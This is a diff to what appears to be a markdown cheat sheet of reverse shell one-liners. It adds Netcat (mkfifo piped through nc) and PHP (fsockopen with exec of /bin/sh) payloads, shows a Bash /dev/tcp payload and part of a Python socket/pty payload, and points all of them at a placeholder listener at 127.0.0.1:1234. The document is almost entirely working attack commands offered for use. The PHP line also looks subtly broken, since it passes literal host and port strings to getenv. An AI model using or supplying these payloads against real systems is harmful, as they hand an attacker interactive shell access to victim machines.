@@ -64,7 +64,7 @@ ____
 ____
 
 ### Reverse shell > <a name="reverse_shell_bash"></a>Bash
-bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'
+###### bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'
 
 ### Reverse shell > <a name="reverse_shell_python"></a>Python
 ```python  
@@ -73,3 +73,9 @@ python -c 'import sys,socket,os,pty;s=socket.socket()
   [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
   pty.spawn("/bin/sh")'
 ```
+
+### Reverse shell > <a name="reverse_shell_netcat"></a>Netcat
+###### rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f
+
+### Reverse shell > <a name="reverse_shell_php"></a>PHP
+###### php -r '$sock=fsockopen(getenv("127.0.0.1"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'
